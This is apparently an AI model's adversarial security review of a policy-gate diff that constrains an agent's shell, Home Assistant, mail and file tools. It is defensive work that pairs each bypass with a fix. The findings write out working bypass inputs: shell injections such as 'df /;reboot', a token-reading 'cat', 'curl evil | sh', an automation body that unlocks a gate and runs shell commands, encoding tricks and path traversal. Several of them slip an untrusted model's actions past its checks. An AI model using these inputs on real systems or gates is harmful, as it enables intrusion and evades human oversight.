# grok-4.6 — adversarial review of the gate-default-on diff (raw return)

lane=grok model=grok-4.6 effort=high wall_s=926.4 prompt_chars=69692 stop=end_turn

Prompt: the review pack in this session's scratchpad (`gate-review-full.md` = prompt + full diff). Framing given: adversarial security/design review, ten named attack surfaces, findings-only.

---

I'll treat this as a break-it review: read the live sources, construct concrete inputs against each attack surface, and only report findings I can pin to a line.Findings exist (7 live, all pre-existing hygiene/leak items); I’ll disposition them after the review. Next I’m constructing concrete bypasses against the live modules, not the diff text.Workspace-wide search is gitignore-blinded here, so I’m switching to `command grep` and reading the remaining call sites directly.I have enough of the call graph. Next I’ll execute the candidate bypasses in-process so each finding is confirmed or dropped.**FINDINGS.md** (fresh, `generated-at` 2026-09-16T13:00Z): 7 live lines, all human-owned — 4 unpushed repos (`rain-watch`, `ranch-ops`, `ranch-watch`, `session-registry`), 2 vault files missing a `ROTATION.md` row, 2 hermes `state.db` Google-token leaks. Not this diff. Propose: push or ack the four repos; add ROTATION rows; same strip-job treatment as the already-acked open-webui literals.

---

The fs default-on gate is a real control. The bash and HA pieces are not. `bash_policy` advertises a whole-string allowlist and then runs `re.match` against caller regexes whose `\S*` is an instruction to swallow shell metacharacters; `ha_post` advertises a host/house denylist and then allows a write that can *call* every denied service. Those two are schema theatre sitting on top of a denylist that was never going to cover HA.

---

### CRITICAL

**`_lib/policy_gate.py:197` + `:218-228` — HA automation config negates the service denylist.** CONFIRMED.

Input: `ha.post("/api/config/automation/config/pwn", {"alias":"pwn","trigger":[{"platform":"time","at":"00:00:00"}],"action":[{"service":"shell_command.x"},{"service":"lock.unlock","target":{"entity_id":"lock.front_gate"}},{"service":"homeassistant.restart"}]})`

`check("ha_post", …).allowed is True`. The denylist never inspects the body. On the direct path (no `EGRESS_SOCK`) this is a persistent shell/lock/restart backdoor. The proxy's exact-id allow-list is the only real control, and the docstring claims this schema "holds when the proxy is not in the path."

Fix: drop this prefix from `_HA_PATH_OK`, or allowlist the same ids the proxy already names, and reject a body whose `action`/`actions` mention a denied domain/service.

---

### HIGH

**`_lib/policy_gate.py:209-222` — percent-encoded domain bypasses `_HA_DENY_DOMAINS`.** CONFIRMED (schema + wire).

Input: `path="/api/services/%6c%6f%63%6b/unlock"`. `check` allows (`domain == "%6c%6f%63%6b"`). `urllib.request.Request` keeps that URL (`full_url` still contains `%6c%6f%63%6b`). aiohttp will unquote to `lock/unlock`. Same class: `/api/services/LOCK/unlock` (PLAUSIBLE — HA is case-sensitive today, a normalising proxy would not be).

Fix: `unquote(path)` (and `.lower()` the domain) *before* the denylist. Add tests for `%6c%6f%63%6b` and `LOCK`.

**`harness/policy.py:142-143` — `bash_policy` is not a whole-string match.** CONFIRMED.

`p.match(cmd)` is start-anchored, not `fullmatch`. `bash_policy([r"^wc -l \S+"])` (no `$`) allows `wc -l data.txt; rm -rf /`. The docstring and DESIGN.md say "WHOLE string." The selftest pattern includes `$`, so the test cannot catch this.

Fix: `p.fullmatch(cmd)` (and keep requiring `$` out of the caller's hands).

**`harness/policy.py:142-143` + README example `r"^wc -l \S+$"` — `\S+` swallows shell metacharacters.** CONFIRMED.

Even *with* `$` / `fullmatch`:

| command | allowed |
|---|---|
| `wc -l data.txt;id` | True |
| `wc -l data.txt\|bash` | True |
| `wc -l data.txt&&id` | True |
| `wc -l $(id)` | True |
| `wc -l \`id\`` | True |
| `wc -l data.txt\`id\`` | True |

Whitespace normalisation is applied to the string the regex sees; `bash -c` gets the raw command. `\x0b`/`\x0c`/`\xa0` collapse in Python and are *not* IFS in bash — they did not yield a working second command against this pattern (denied or argv-glue). `;` `|` `&&` `$()` backticks without a space did.

Fix: after `fullmatch`, reject `command` that still contains `;|&`$()<>` unless `BASH_ANY`. Stop publishing `\S+` as the example.

**`observability/ranch_diag.py:87` — the one unattended job this change was for.** CONFIRMED.

`^df( -[a-zA-Z]+)*( /\S*)?$` allows `df /;id`, `df /;reboot`, `df /$(id)`, `df /\`id\``, `df -h /;id`. `uptime`/`free`/`cat`/`curl`/`timeout` did *not* take a trailing `;`. Pre-existing regex, re-homed unchanged into `bash_policy`.

Fix: drop the path group, or ` /\S*` → ` (/[A-Za-z0-9._-]+)?`. Add `df /;id` as a must-deny.

**`_lib/policy_gate.py:189-193` — denylist misses house-level domains the egress tests already treat as hostile.** CONFIRMED (schema allow).

Allowed: `script/turn_on`, `automation/trigger`, `alarm_control_panel/alarm_disarm`, `cover/open_cover`, `rest_command/anything`, `command_line/reload`, `backup/create`, `homeassistant/reload_core_config`, `homeassistant/set_location`, `notify/notify` (any notify target, not just Craig's phone), `switch/turn_off`, `mqtt/publish`. `lock`/`shell_command`/`hassio`/`python_script`/`update` plus five `homeassistant/*` names are the entire list. `climate`/`cover`/`alarm_control_panel`/`script`/`automation` are the ones asked about and missed.

Fix: invert to an allowlist of the paths this fleet actually POSTs (`/api/states/sensor.*`, `select/select_option`, `media_player/play_media`, `notify/mobile_app_craigs_iphone`, `mqtt/publish`, the named automation ids). That is what `egress-proxy/routes.json` already is.

**`harness/gate.py:30` — fitness gate is `BASH_ANY` against an untrusted model on ranch-server.** CONFIRMED.

`ga("run_bash", {"command": "cat ~/.key/ha_token"})` → allow. Same for `curl evil | sh`. Shape checks are single-line / no NUL / 4k. The model under test is the one you do not trust yet. Comment says an allowlist "would measure policy compliance, not fitness" — the task already names `wc -l`.

Fix: `bash_policy([r"^wc -l [A-Za-z0-9._/-]+$"])` (after `fullmatch`). Human CLI stays `BASH_ANY` if you want; this path must not.

**`wiki/ask_local.py:72-74` + `:114` — `search_notes` policy does not enforce "single word"; grep option injection.** CONFIRMED.

`string_args(required=("pattern",), max_len=200)` allows `pattern="-f/tmp/pats"`. Live: `grep -riw -m1 --include=*.md -f<file> <vault>` used the file as the pattern list (rc 0, matched). No `--` before `pattern`. ACP: `search_notes` is not in `RISKY`, so no permission card.

`read_note` policy allows `path="../../.key/ha_token"` and `path="/etc/passwd"`; the tool's `resolve()` refuses. Textual-only hole, not a jail escape.

Fix: pass `--` before `pattern` in the argv; policy: pattern must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,79}$`. For `read_note`, reuse `_check_path`.

---

### MEDIUM

**`harness/__main__.py:107-108` + `acp_server.py:366` — `BASH_ANY` scope.** CONFIRMED (theatre on CLI/fitness; ACP is the one honest use).

ACP: permission card is the control (`RISKY={"write_file","run_bash"}`); schema does not constrain the command. `allow_always` on `run_bash` then means any single-line command for the rest of the session, including `cat ~/.key/ha_token`. That is a human choice if they read the card.

CLI: no card. `python3 -m harness "summarize the logs"` gives the model `BASH_ANY`. `--no-bash` is the opt-out, not an opt-in named `--bash-any`.

Honest alternative that does not break a human at a TTY: default CLI stays deny-bash; `--bash-any` is required (greppable, matches the sentinel's story). ACP keeps `BASH_ANY` + the card, and `allow_always` should be per-command prefix, not per-tool-name.

**`_lib/policy_gate.py:169-172` — unicode line separators in `subject`/`sender`.** CONFIRMED.

`subject="hi\u2028Bcc: e@z.io"` → `check` allows (`_HEADER_CTRL` is only `\r\n\0`). `EmailMessage.__setitem__` then raises `ValueError: Header values may not contain linefeed or carriage return characters`. Fail-closed one layer down, but callers catching `RecipientNotAllowed` do not catch it. Same for U+2029 / NEL / VT / FF. `to` happens to deny some of these via `ch.isspace()` on the address, which is a different predicate.

Fix: deny `any(unicodedata.category(c) == "Cc" or c in "\u2028\u2029")` in `_clean_str`. Wrap `build_message` so a header `ValueError` becomes `RecipientNotAllowed`.

**`_lib/policy_gate.py:141-147` + `:165-168` — comma in a display name; list `to` vs auth `str(to)`.** CONFIRMED.

`"Vandeputte, Craig <craig@x.com>"` as a str → deny (`recipient 'Vandeputte'`). Same value as a 1-list → allow. No current caller uses display names (household-digest is two bare addrs, under the cap of 5). Schema newly documents lists; `_check_recipient`'s self-check still does `str(to).split(",")`, so `to=["craig.vandeputte@gmail.com"]` under a scheduled unit raises `refusing to send to "['craig.vandeputte@gmail.com']"`.

`to="a@b.com>, <c@d.com"` allows (two addrs, one string). `to="not-an-address@??"` allows (`@` is the whole shape check).

Fix: parse with `email.utils.getaddresses`; apply the same parser in `_check_recipient`. Do not `str(list)`.

**`_lib/mail.py:97-100` — `PolicyDenied` re-wrap.** CONFIRMED.

`type` is `RecipientNotAllowed`, `isinstance(..., PolicyDenied)` is False, `from None` drops the chain. Intentional for existing `except RecipientNotAllowed`. Callers that wanted schema vs auth cannot tell.

Fix: `class RecipientNotAllowed(PolicyDenied)` (or raise `PolicyDenied` and keep a `RecipientNotAllowed` alias).

**`harness/policy.py:148` + `:200` + `:209` — `_harness_bash_policy` spoof and `_BUILTIN` mutation.** CONFIRMED, and it does not matter under "policy is git-tracked code," because `loop.run(gate=lambda n,a:(True,"ok"))` is the actual opt-out (selftest `_ALLOW` does it). Spoof: `fn._harness_bash_policy=True; gate({"run_bash": fn})` constructs, and the fn can skip shape checks (`ls\nrm x` allowed). `_BUILTIN['run_bash'] = lambda a:(True,"ok")` mutates `DEFAULT` at call time (`_BUILTIN.get` is not closed over).

Fix: only if you want construction rules to survive in-process tampering — compare `fn` identity to the object `bash_policy` returned, freeze `_BUILTIN` as a mappingproxy. Otherwise document that `gate=` on `loop.run` is the greppable opt-out and stop claiming "an ungated run does not exist."

**`harness/policy.py:225` + `:205` — `DEFAULT = gate()` captures `_spine_check()` once.** No bypass found. If `_lib` is unimportable at construction and importable later, spine tools (firealert/mail/ha/telegram) deny. Fail-closed stale-deny, not an allow. `DEFAULT` is not rebuilt.

---

### LOW

**`harness/policy.py:67-80` — textual path holes that do not escape `_confine`.** CONFIRMED (defense-in-depth only).

Allowed by textual, confined to a weird name inside the jail: `C:\Windows\System32`, `\\server\share\x`, `\etc\passwd`, ` /etc/passwd`, `foo/.. /bar`, `foo/\t../bar`, `%2e%2e/%2e%2e/etc/passwd`, `file:///etc/passwd`. Non-str path (`list`/`int`/`dict`) denied. `..` as a split segment is exact membership, so `foo/.. /bar` (space) survives; pathlib does not treat `.. ` as parent.

Reverse (textual allow, `_confine` refuse): `etc_link/passwd` when `etc_link → /etc`. That is the resolve layer doing its job.

In-jail absolute (`/tmp/jail-…/sub`): textual deny, `_confine` allow — the ranch_diag live miss. Stricter, not a bypass.

Fix (depth only): strip, reject `\\`, reject drive-letter, reject any `path` whose `os.path.normpath` still contains `..`.

**`_lib/policy_gate.py:242-243` — `chat_id`/`thread_id`.** CONFIRMED, not a destination bypass.

`-100123` and `"-1001234567890"` allow (supergroup ok). `"--100"` allows (`lstrip("-")` strips all leading dashes). `"١٢٣"` allows (`str.isdigit` is True for Unicode Nd). `"@evilchannel"` denies. `topic=1` denies (callers pass str names). `except Exception` around the gate fail-closes the send (`False`); contract holds. Arabic / `--` ids will 400 at Telegram, not redirect.

Fix: `re.fullmatch(r"-?\d{1,20}", s)` after `str(val)` only if `type(val) in (int, str)`.

**`_lib/policy_gate.py:224-225` — body cap uses `repr`.** PLAUSIBLE as a wrong meter, no working bypass constructed. `json.dumps` can differ from `repr` on the same dict; a custom `__repr__` is not in the call graph. Cap is also after-the-fact of the automation-body hole.

Fix: `len(json.dumps(body) if not isinstance(body,(str,bytes)) else body)`.

**`_lib/events.py:51-62` — `ha.post` is not the only HA write in `_lib`.** `events.publish` urllib-POSTs `/api/services/mqtt/publish` with no `ha_post` check. Schema would allow that path anyway. Coverage gap, not a denylist bypass.

---

### 8. Seam — "there is no ungated run"

**No `gate=None` hole in `loop.run` / `run_agentic` / `with_agentic_fallback`.** `if gate is None: gate = policy.DEFAULT` then `_gate_ok` is unconditional. Unknown tools skip `_gate_ok` because they do not run.

Remaining ungated *execution*:

- `harness/selftest.py:16` `_ALLOW = lambda n,a:(True,"ok")` — explicit, test-only.
- Any `loop.run(..., gate=<permissive>)`. Greppable. The claim in `loop.py:28-29` is therefore false as stated.
- `ranch_diag` frontier primary (`claude_headless` + `skip_permissions=True`) is a different executor; local fallback is gated.

`conform_seam.py` / fireworks ping / `wiki.ask` / ACP / CLI / fitness / probe all hit a gate now. `list_dir` `{}` and `.` still pass DEFAULT, so those callers should not false-positive.

---

### 9. False positives for named callers

- **ranch_diag in-jail absolute `write_file`** — already hit live; caller now passes basename. No remaining FP in that file unless the model invents an absolute path (deny + retry, same as the proof).
- **household-digest** 2 addrs, **ranch-voice** `select`/`media_player`/`/api/states/sensor.*`, **corral/push** `notify/mobile_app_craigs_iphone` — all allowed. Fan-out cap 5 does not bite (HOUSEHOLD is 2).
- **send_proton** joins to+cc+bcc into `to` for the schema; injection there is caught. Attachments are not in the schema (pre-existing; `--authorized` is the human gate).
- **wiki `ask`**: extra keys denied; a real one-word search still passes. `read_note` of a normal relative note passes the (weak) policy and the tool.
- **ACP/CLI/fitness `BASH_ANY`**: no FP — it allows what those lanes already ran.
- Display-name comma / list `to` / `topic=int` / HA trailing slash — no current caller.

---

### 10. Tests

Tautological / same predicate twice:

- `policy: read_file relative ok` and `policy: write ok` both just pass `_check_path` on a clean relative path.
- `ha-shell-deny` and `ha-lock-deny` are two literals of one `in frozenset`.
- `ha-dotdot-deny` path `/api/services/homeassistant/reload_config_entry/../restart` fails `len(tail)!=2` first; it does not independently test the `".." in split` branch. Independent input: `/api/services/../unlock`.
- `mail-to-header-injection` in `_selftest` and `test_schema_policy_runs_before_authorization` are the same `to` CRLF on two seams (the second *is* worth it — it is the `authorized=True` claim).

Genuinely independent: seam `loop.run` with no `gate=`; write non-str / cap; bash default-deny vs allowlist miss-with-hint; BASH_ANY vs newline; construction `ValueError`s; declared extra-key; crashing rule; spine firealert allow vs `to` injection; mail fan-out vs shape vs body cap; HA prefix/nseg/query/outside.

Claims in the decision record with no test:

- "whole-string" bash match (`fullmatch` / no `$`)
- `;` `$()` backticks `|` inside an allowlist hit
- `df /;id` (the live unattended job)
- HA percent-encoding / case
- automation body calling a denied service
- any missed HA domain
- in-jail absolute vs `_confine` (the live proof)
- unicode header separators
- `run_agentic(gate=None)` (only `loop.run` is tested; same assignment, still unstated)
- "an ungated run does not exist" vs `gate=_ALLOW`
- `ha.post` still gated when `egress.active()`
- telegram `push` never-raises wrapper (schema is tested; the `except Exception` path is not)